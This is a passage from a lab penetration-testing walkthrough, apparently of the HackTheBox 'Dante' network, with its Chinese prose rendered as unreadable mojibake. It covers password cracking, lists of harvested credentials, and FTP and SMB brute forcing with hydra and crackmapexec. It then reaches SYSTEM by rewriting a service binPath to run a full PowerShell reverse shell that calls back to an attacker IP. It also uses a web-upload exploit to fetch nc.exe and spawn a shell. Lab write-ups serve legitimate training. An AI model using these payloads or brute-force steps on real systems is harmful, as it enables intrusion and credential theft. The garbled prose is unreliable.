<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">--wordlist</span><span class="o">=</span>/webtools/dicts/rockyou.txt 172.16.1.12_unshadow <span class="nt">--format</span><span class="o">=</span>md5crypt-long

Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>md5crypt-long, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$1$ </span><span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 32/64]<span class="o">)</span>
Will run 8 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
manchesterunited <span class="o">(</span>julian<span class="o">)</span>     
1g 0:00:00:00 DONE <span class="o">(</span>2023-12-27 07:17<span class="o">)</span> 25.00g/s 70400p/s 70400c/s 70400C/s bebito..medicina
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<p>è‡³æ­¤æˆ‘ä»¬æŒæ¡äº†å¤šä¸ªç”¨æˆ·å‡­è¯ï¼š</p>
<ol>
  <li>julian/manchesterunited</li>
  <li>ben/Welcometomyblog</li>
  <li>balthazar/TheJoker12345!</li>
  <li>mrb3n/S3kur1ty2020!</li>
  <li>Admin_129834765/SamsungOctober102030</li>
</ol>

<p>è¿˜æœ‰æ­¤å‰åœ¨ 172.16.1.20 ä¸­è·å–åˆ°çš„ excel è¡¨æ ¼ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>asmith	Princess1
smoggat	Summer2019
tmodle	P45678!
ccraven	Password1
kploty	Teacher65
jbercov	4567Holiday1
whaguey	acb123
dcamtan	WorldOfWarcraft67
tspadly	RopeBlackfieldForwardslash
ematlis	JuneJuly1TY
fglacdon	FinalFantasy7
tmentrso	65RedBalloons
dharding	WestminsterOrange5
smillar	MarksAndSparks91
bjohnston	Bullingdon1
iahmed	Sheffield23
plongbottom	PowerfixSaturdayClub777
jcarrot	Tanenbaum0001
lgesley	SuperStrongCantForget123456789
</code></pre></div></div>
<h1 id="linux-172161101">Linux: 172.16.1.101</h1>
<p>172.16.1.101	21
172.16.1.101	135
172.16.1.101	139
172.16.1.101	445</p>

<h2 id="ftp-çˆ†ç ´">FTP çˆ†ç ´</h2>
<p>172.16.1.101 çš„ ftp ä¸å…è®¸åŒ¿åç™»é™†ï¼Œå¹¶ä¸” FileZilla Server 0.9.60 beta ä¸å­˜åœ¨å¯ç”¨çš„ expã€‚</p>

<p>å€ŸåŠ©æ­¤å‰è·å–çš„ç”¨æˆ·åå¯†ç ï¼Œæˆ‘ä»¬å¯ä»¥çˆ†ç ´ ftpï¼Œé¦–å…ˆå°†ç”¨æˆ·åä¿å­˜åœ¨ users.txt å¯†ç ä¿å­˜åœ¨ password.txt ä¸­ã€‚ç„¶åè¿è¡Œ hydraã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">HYDRA_PROXY</span><span class="o">=</span>socks5://localhost:1080 
hydra <span class="nt">-L</span> users.txt <span class="nt">-P</span> password.txt 172.16.1.101 ftp <span class="nt">-V</span>
</code></pre></div></div>
<p>é»˜è®¤æƒ…å†µä¸‹ hydra ä¼šå¯¹å•ä¸ªç”¨æˆ·åå°è¯•æ‰€æœ‰çš„å¯†ç ï¼Œä¸ºäº†åŠ å¿«é€Ÿåº¦ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ combine æ¨¡å¼æ¥å°†ç”¨æˆ·åå¯†ç ä¸€ä¸€å¯¹åº”ã€‚å…ˆå°†ç”¨æˆ·åå¯†ç ä»¥ : åˆ‡åˆ†å†™åœ¨å•ä¸ªæ–‡ä»¶ä¸­ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>asmith:Princess1
smoggat:Summer2019
tmodle:P45678!
ccraven:Password1
kploty:Teacher65
jbercov:4567Holiday1
whaguey:acb123
dcamtan:WorldOfWarcraft67
tspadly:RopeBlackfieldForwardslash
ematlis:JuneJuly1TY
fglacdon:FinalFantasy7
tmentrso:65RedBalloons
dharding:WestminsterOrange5
smillar:MarksAndSparks91
bjohnston:Bullingdon1
iahmed:Sheffield23
plongbottom:PowerfixSaturdayClub777
jcarrot:Tanenbaum0001
lgesley:SuperStrongCantForget123456789
julian:manchesterunited
ben:Welcometomyblog
balthazar:TheJoker12345!
mrb3n:S3kur1ty2020!
Admin_129834765:SamsungOctober102030
</code></pre></div></div>

<p>ç„¶å hydra çˆ†ç ´æ—¶ä½¿ç”¨ -C å‚æ•°ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">HYDRA_PROXY</span><span class="o">=</span>socks5://localhost:1080 
hydra <span class="nt">-C</span> combine.txt 172.16.1.101 ftp <span class="nt">-V</span>
</code></pre></div></div>
<p>å¾ˆå¿«å°±èƒ½å¤Ÿå¾—åˆ°ç»“æœï¼Œdharding/WestminsterOrange5 å¯ä»¥æ­£å¸¸ç™»é™†</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>21][ftp] host: 172.16.1.101   login: dharding   password: WestminsterOrange5
</code></pre></div></div>
<p>ç™»é™†ä¹‹åè·å–åˆ° <code class="language-plaintext highlighter-rouge">Remote login.txt</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dido,
I<span class="s1">'ve had to change your account password due to some security issues we have recently become aware of

It'</span>s similar to your FTP password, but with a different number <span class="o">(</span>ie. not 5!<span class="o">)</span>

Come and see me <span class="k">in </span>person to retrieve your password.

thanks,
James                                                                                                                    
</code></pre></div></div>
<p>ä»æç¤ºä¸­å¯ä»¥çœ‹å‡ºè¯¥ç”¨æˆ·è¿œç¨‹ç™»é™†çš„å¯†ç ä¸ FTP å¯†ç ç›¸åŒä½†æœ€åä¸€ä¸ªæ•°å­—ä¸æ˜¯ 5ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªå¯†ç å­—å…¸æ¥è¿›è¡Œçˆ†ç ´ã€‚</p>

<h2 id="smb-çˆ†ç ´">SMB çˆ†ç ´</h2>
<p>è¿™å°ä¸»æœºæ²¡æœ‰ ssh,ä¹Ÿæ²¡æœ‰å¼€æ”¾ 3389 ç«¯å£ï¼Œä½†å¯ä»¥å°è¯•ç”¨ smb æ¥éªŒè¯å¯†ç æ˜¯å¦æ­£ç¡®ã€‚</p>

<p>cme æˆ–è€… nxc é›†æˆäº† SMB çˆ†ç ´çš„åŠŸèƒ½ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> crackmapexec smb 172.16.1.101 <span class="nt">-u</span> users.txt <span class="nt">-p</span> password.txt
</code></pre></div></div>
<p>å°è¯•åˆ° WestminsterOrange17 æ—¶æˆåŠŸç™»é™†ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 18362 x64 <span class="o">(</span>name:DANTE-WS02<span class="o">)</span> <span class="o">(</span>domain:DANTE-WS02<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange0 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange1 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange2 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange3 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange4 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange6 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange7 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange8 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange9 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange10 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange11 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange12 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange13 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange14 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange15 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange16 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>+] DANTE-WS02<span class="se">\d</span>harding:WestminsterOrange17
</code></pre></div></div>
<h2 id="winrm-è¿œç¨‹ç™»é™†">WinRM è¿œç¨‹ç™»é™†</h2>
<p>172.16.1.101 å®é™…ä¸Šå¼€æ”¾äº† 5985 ç«¯å£ï¼Œæ­¤å‰ä½¿ç”¨ fscan æ‰«ææ—¶æ²¡æœ‰æ‰«åˆ°çš„åŸå› åœ¨äºï¼Œfscan é»˜è®¤æ‰«æç«¯å£ï¼šâ€21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017â€</p>

<p>goby ä¼ä¸šç«¯å£åˆ—è¡¨ä¸­ä¹Ÿæ²¡æœ‰ 5985ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>21,22,23,25,53,U:53,U:69,80,81,U:88,110,111,U:111,123,U:123,135,U:137,139,U:161,U:177,389,U:427,443,445,465,500,515,U:520,U:523,548,623,U:626,636,873,902,1080,1099,1433,U:1434,1521,U:1604,U:1645,U:1701,1883,U:1900,2049,2181,2375,2379,U:2425,3128,3306,3389,4730,U:5060,5222,U:5351,U:5353,5432,5555,5601,5672,U:5683,5900,5938,5984,6000,6379,7001,7077,8080,8081,8443,8545,8686,9000,9001,9042,9092,9100,9200,9418,9999,11211,U:11211,27017,U:33848,37777,50000,50070,61616
</code></pre></div></div>

<p>ä»¥åä½¿ç”¨ fscan æ‰«ææ—¶å¯ä»¥ä½¿ç”¨ goby å†…ç½®çš„å¸¸ç”¨ç«¯å£åˆ—è¡¨ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fscan <span class="nt">-h</span> 172.16.1.0/24 <span class="nt">-socks5</span> 127.0.0.1:1080 <span class="nt">-p</span> <span class="s2">"1,7,9,13,19,21-23,25,37,42,49,53,69,79-81,85,105,109-111,113,123,135,137-139,143,161,179,222,264,384,389,402,407,443-446,465,500,502,512-515,523-524,540,548,554,587,617,623,689,705,771,783,873,888,902,910,912,921,993,995,998,1000,1024,1030,1035,1090,1098-1103,1128-1129,1158,1199,1211,1220,1234,1241,1300,1311,1352,1433-1435,1440,1494,1521,1530,1533,1581-1582,1604,1720,1723,1755,1811,1900,2000-2001,2049,2082,2083,2100,2103,2121,2199,2207,2222,2323,2362,2375,2380-2381,2525,2533,2598,2601,2604,2638,2809,2947,2967,3000,3037,3050,3057,3128,3200,3217,3273,3299,3306,3311,3312,3389,3460,3500,3628,3632,3690,3780,3790,3817,4000,4322,4433,4444-4445,4659,4679,4848,5000,5038,5040,5051,5060-5061,5093,5168,5247,5250,5351,5353,5355,5400,5405,5432-5433,5498,5520-5521,5554-5555,5560,5580,5601,5631-5632,5666,5800,5814,5900-5910,5920,5984-5986,6000,6050,6060,6070,6080,6082,6101,6106,6112,6262,6379,6405,6502-6504,6542,6660-6661,6667,6905,6988,7001,7021,7071,7080,7144,7181,7210,7443,7510,7579-7580,7700,7770,7777-7778,7787,7800-7801,7879,7902,8000-8001,8008,8014,8020,8023,8028,8030,8080-8082,8087,8090,8095,8161,8180,8205,8222,8300,8303,8333,8400,8443-8444,8503,8800,8812,8834,8880,8888-8890,8899,8901-8903,9000,9002,9060,9080-9081,9084,9090,9099-9100,9111,9152,9200,9390-9391,9443,9495,9809-9815,9855,9999-10001,10008,10050-10051,10080,10098,10162,10202-10203,10443,10616,10628,11000,11099,11211,11234,11333,12174,12203,12221,12345,12397,12401,13364,13500,13838,14330,15200,16102,17185,17200,18881,19300,19810,20010,20031,20034,20101,20111,20171,20222,22222,23472,23791,23943,25000,25025,26000,26122,27000,27017,27888,28222,28784,30000,30718,31001,31099,32764,32913,34205,34443,37718,38080,38292,40007,41025,41080,41523-41524,44334,44818,45230,46823-46824,47001-47002,48899,49152,50000-50004,50013,50500-50504,52302,55553,57772,62078,62514,65535"</span> <span class="nt">-nobr</span> <span class="nt">-nopoc</span>
</code></pre></div></div>

<p>5985 ç«¯å£å¯ä»¥ä½¿ç”¨ evil-winrm è¿›è¡Œè¿æ¥ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> evil-winrm <span class="nt">-i</span> 172.16.1.101 <span class="nt">-u</span> dharding <span class="nt">-p</span> WestminsterOrange17
</code></pre></div></div>
<p>ç™»é™†ä¹‹åå¯ä»¥æŸ¥çœ‹ dharding ç”¨æˆ·çš„ flag.txt</p>

<h2 id="ææƒ-æœåŠ¡-acl-é…ç½®é”™è¯¯">ææƒ: æœåŠ¡ ACL é…ç½®é”™è¯¯</h2>
<p>dharding Desktop ç›®å½•ä¸­æœ‰ä¸€ä¸ª qc æ–‡ä»¶ï¼Œå†…å®¹ä¸º IObitUnSvrã€‚</p>

<p>ä½¿ç”¨ evil-winrm åŠ è½½ winPEASã€‚ï¼ˆevil-winrm åŠ è½½ ps è„šæœ¬çš„é€Ÿåº¦æ¯”è¾ƒæ…¢ï¼‰</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> evil-winrm <span class="nt">-i</span> 172.16.1.101 <span class="nt">-u</span> dharding <span class="nt">-p</span> WestminsterOrange17 <span class="nt">-s</span> /webtools/movement/PowerSharpPack/PowerSharpBinaries
Bypass-4MSI
Invoke-winPEAS.ps1
Invoke-winPEAS
</code></pre></div></div>

<p>å…³æ³¨éå¾®è½¯ç¨‹åºæˆ–æœåŠ¡ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª IObit Uninstallerã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•”â•â•â•â•â•â•â•â•â•â•â•£ Scheduled Applications <span class="nt">--Non</span> Microsoft--
â•š Check <span class="k">if </span>you can modify other <span class="nb">users </span>scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                              
    <span class="o">(</span>dharding<span class="o">)</span> Uninstaller_SkipUac_dharding: C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span><span class="se">\I</span>Obit<span class="se">\I</span>Obit Uninstaller<span class="se">\I</span>ObitUninstaler.exe /UninstallExplorer 
</code></pre></div></div>
<p>æŸ¥è¯¢ exploitdb å¯ä»¥å‘ç°è¯¥åº”ç”¨å­˜åœ¨å†å²æ¼æ´ï¼š</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-----------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                                                   |  Path
<span class="nt">-----------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
IObit Uninstaller 10 Pro - Unquoted Service Path                                                                 | windows/local/49371.txt
IObit Uninstaller 9.1.0.8 - <span class="s1">'IObitUnSvr'</span> Unquoted Service Path                                                   | windows/local/47538.txt
IObit Uninstaller 9.5.0.15 - <span class="s1">'IObit Uninstaller Service'</span> Unquoted Service Path                                   | windows/local/48543.txt
<span class="nt">-----------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------</span>
</code></pre></div></div>
<p>ç›®å½•ä¸‹çš„ History.txt åŒ…å«äº†ç‰ˆæœ¬ä¿¡æ¯ï¼Œç‰ˆæœ¬ä¸º 9.5ï¼Œå­˜åœ¨ Unquoted Service Path ææƒæ¼æ´ã€‚è¯¥æ¼æ´çš„åˆ©ç”¨éœ€è¦åœ¨ C:\Program Files (x86)\IObit å†™å…¥æ¶æ„çš„ IObit.exeï¼Œä½†è¯¥è·¯å¾„æ²¡æœ‰å†™å…¥æƒé™ã€‚</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls <span class="nb">.</span>
<span class="nb">.</span> NT SERVICE<span class="se">\T</span>rustedInstaller:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
  NT SERVICE<span class="se">\T</span>rustedInstaller:<span class="o">(</span>I<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
  NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
  NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
  BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
  BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
  BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>RX<span class="o">)</span>
  BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>GR,GE<span class="o">)</span>
  CREATOR OWNER:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
  APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL APPLICATION PACKAGES:<span class="o">(</span>I<span class="o">)(</span>RX<span class="o">)</span>
  APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL APPLICATION PACKAGES:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>GR,GE<span class="o">)</span>
  APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL RESTRICTED APPLICATION PACKAGES:<span class="o">(</span>I<span class="o">)(</span>RX<span class="o">)</span>
  APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL RESTRICTED APPLICATION PACKAGES:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>GR,GE<span class="o">)</span>
</code></pre></div></div>

<p>é€šè¿‡ Get-ServiceAcl.ps1 æŸ¥çœ‹ IObitUnSvr æœåŠ¡çš„ ACL æ—¶ï¼Œå‘ç° dharding å…·å¤‡ ChangeConfig æƒé™ï¼Œå¯ä»¥æ›´æ”¹é…ç½®ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>harding<span class="se">\D</span>ocuments&gt; Get-ServiceAcl.ps1
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>harding<span class="se">\D</span>ocuments&gt; <span class="s2">"IObitUnSvr"</span> | Get-ServiceAcl | <span class="k">select</span> <span class="nt">-ExpandProperty</span> Access

ServiceRights     : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, Interrogate, ReadControl
AccessControlType : AccessAllowed
IdentityReference : DANTE-WS02<span class="se">\d</span>harding
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None
</code></pre></div></div>
<p>å› æ­¤åªéœ€è¦æ›´æ”¹æœåŠ¡çš„ binPathï¼Œç„¶åé‡å¯æœåŠ¡å³å¯ææƒã€‚</p>

<p>é¦–å…ˆå‡†å¤‡ä¸€ä¸ªåå¼¹ shell çš„ bat è„šæœ¬ï¼šrunme.bat</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@echo off
start /b powershell.exe <span class="nt">-exec</span> bypass <span class="nt">-enc</span> &lt;base64_encoded_payload&gt; 
<span class="nb">exit</span> /b
</code></pre></div></div>
<p>å…¶ä¸­çš„ base64_encoded_payload åŸå§‹ payload å¦‚ä¸‹ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s1">'10.10.14.5'</span>,9001<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte[]]<span class="nv">$bytes</span> <span class="o">=</span> 0..65535|%<span class="o">{</span>0<span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>, 0, <span class="nv">$bytes</span>.Length<span class="o">))</span> <span class="nt">-ne</span> 0<span class="o">){</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="o">(</span>New-Object <span class="nt">-TypeName</span> System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> 2&gt;&amp;1 | Out-String <span class="o">)</span><span class="p">;</span><span class="nv">$sendback2</span> <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s1">'PS '</span> + <span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path + <span class="s1">'&gt; '</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding]::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span>

</code></pre></div></div>
<p>ä½¿ç”¨ UTF-16LE å’Œ base64 ç¼–ç åè¿›è¡Œå¡«å……å†™å…¥ runme.bat</p>

<p>å°† runme.bat ä¸‹è½½åˆ° c:\temp ä¸‹ã€‚</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mkdir</span><span class="w"> </span><span class="nx">c:\temp</span><span class="w">
</span><span class="n">cd</span><span class="w"> </span><span class="nx">c:\temp</span><span class="w">
</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="s1">'http://10.10.14.5:9999/runme.bat'</span><span class="p">,</span><span class="s1">'c:\temp\runme.bat'</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>
<p>æœ¬åœ°ç›‘å¬ 9001ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvp</span> 9001
</code></pre></div></div>
<p>æ¥ç€åœ¨ç›®æ ‡ä¸­æ›´æ”¹ IObitUnSvr çš„é…ç½®ã€‚</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sc.exe</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">IObitUnSvr</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="nx">IObitUnSvr</span><span class="w"> </span><span class="nx">binPath</span><span class="o">=</span><span class="s2">"cmd.exe /c c:\temp\runme.bat"</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">qc</span><span class="w"> </span><span class="nx">IObitUnSvr</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">IObitUnSvr</span><span class="w">
</span></code></pre></div></div>
<p>å¯åŠ¨ IObitUnSvr å¯ä»¥æ¥æ”¶åˆ° shellã€‚</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop</span><span class="w">


</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">                                                                  
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">                                                                  
</span><span class="nt">-a</span><span class="o">----</span><span class="w">       </span><span class="mi">08</span><span class="n">/01/2021</span><span class="w">     </span><span class="nx">05:34</span><span class="w">             </span><span class="nx">33</span><span class="w"> </span><span class="nx">flag.txt</span><span class="w">                                                              
</span><span class="nt">-a</span><span class="o">----</span><span class="w">       </span><span class="mi">14</span><span class="n">/07/2020</span><span class="w">     </span><span class="nx">03:18</span><span class="w">           </span><span class="nx">1417</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Edge.lnk</span><span class="w">                                                    


</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="nx">flag.txt</span><span class="w">
</span><span class="n">DANTE</span><span class="p">{</span><span class="n">Qu0t3_I_4M_secure</span><span class="o">!</span><span class="nx">_unQu0t3</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<h1 id="windows-172161102">Windows: 172.16.1.102</h1>
<p>å¼€æ”¾ç«¯å£ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5985,135,445,3389,139,3306,443,47001,80,5040
</code></pre></div></div>
<ol>
  <li>80/443: Online Marriage Registration System</li>
  <li>47001: Microsoft-HTTPAPI/2.0</li>
</ol>

<h2 id="80-ç«¯å£æ–‡ä»¶ä¸Šä¼ æ¼æ´">80 ç«¯å£æ–‡ä»¶ä¸Šä¼ æ¼æ´</h2>
<p>80 ç«¯å£éƒ¨ç½²äº†ä¸€ä¸ª Online Marriage Registration Systemã€‚exploitdb å¯ä»¥æœç´¢åˆ°ç›¸å…³çš„ expï¼š</p>
<ul>
  <li>https://www.exploit-db.com/exploits/49557</li>
</ul>

<p>é¦–å…ˆä¸Šä¼  nc</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> python /webtools/exploit/OMRS/exp.py <span class="nt">-u</span> http://172.16.1.102/ <span class="nt">-c</span> <span class="s1">'powershell.exe wget 10.10.14.5:9999/nc.exe -O nc.exe'</span>
</code></pre></div></div>

<p>ç„¶åä½¿ç”¨ nc åå¼¹ shellã€‚</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> python /webtools/exploit/OMRS/exp.py <span class="nt">-u</span> http://172.16.1.102/ <span class="nt">-c</span> <span class="s1">'nc.exe -e powershell.exe 10.10.14.5 9001'</span>
</code></pre></div></div>

<p>è·å–åˆ° dante-ws03\blake æƒé™åå¯è¯»å–ç”¨æˆ· flag.txt</p>

<h2 id="ææƒ-badpotato">ææƒ: BadPotato</h2>
<p>é¦–å…ˆä½¿ç”¨ winPEAS æ”¶é›†ä¿¡æ¯ï¼Œå¯ä»¥å°†ç»“æœå†™åˆ°æ–‡ä»¶ï¼Œç„¶åæ‹–å›æ¥åˆ†æã€‚</p>
